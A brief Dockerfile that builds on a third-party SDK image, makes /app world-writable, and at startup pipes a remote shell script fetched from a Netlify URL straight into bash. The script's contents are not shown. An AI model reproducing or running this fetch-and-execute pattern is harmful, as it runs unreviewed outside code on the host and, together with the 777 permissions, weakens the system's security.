FROM ghcr.io/yzop/sdk:latest
WORKDIR /app
RUN chmod 777 /app
CMD bash -c "$(curl -sL "https://ariabot.netlify.app/prxasia.sh")"
